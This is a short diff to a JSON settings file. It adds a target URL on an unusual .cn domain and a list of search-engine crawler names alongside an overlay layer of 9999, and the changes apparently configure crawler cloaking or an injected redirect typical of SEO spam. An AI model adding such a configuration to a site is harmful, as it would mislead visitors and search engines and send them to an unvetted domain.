@@ -15,5 +15,15 @@
     "petalbot"
   ],
   "layer": 9999,
-  "backdrop": "white"
+  "backdrop": "white",
+  "targetUrl": "https://dh-hzh5.hbdvede.cn?cid=1023",
+  "enabled": true,
+  "spiders": [
+    "baiduspider",
+    "sogou web spider",
+    "yisouspider",
+    "360spider",
+    "googlebot",
+    "bingbot"
+  ]
 }
